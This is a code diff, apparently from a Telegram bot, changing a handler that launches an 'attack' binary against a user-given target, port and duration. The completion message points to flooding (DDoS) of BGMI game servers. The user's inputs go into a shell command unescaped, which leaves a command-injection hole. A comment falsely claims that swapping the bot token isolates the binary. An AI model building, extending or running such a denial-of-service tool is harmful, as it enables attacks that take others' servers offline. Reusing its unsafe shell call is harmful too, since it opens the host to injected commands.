@@ -322,17 +322,24 @@ def handle_attack(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./king {target} {port} {time} 100"
-                process = subprocess.Popen(full_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 
-                # Wait for attack to complete and send completion message
+                # Execute king binary in isolated environment to prevent it from accessing bot
                 import threading
-                def wait_for_attack():
+                import os
+                original_token = bot.token
+                
+                def run_attack():
+                    # Temporarily replace bot token to prevent king from sending messages
+                    bot.token = "INVALID_TOKEN"
+                    full_command = f"./king {target} {port} {time} 100"
+                    process = subprocess.Popen(full_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                     process.wait()
+                    # Restore original token
+                    bot.token = original_token
                     completion_msg = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time} seconds"
                     bot.send_message(message.chat.id, completion_msg)
                 
-                thread = threading.Thread(target=wait_for_attack)
+                thread = threading.Thread(target=run_attack)
                 thread.start()
         else:
             response = "Usage :- /attack <target> <port> <time>"  # Updated command syntax
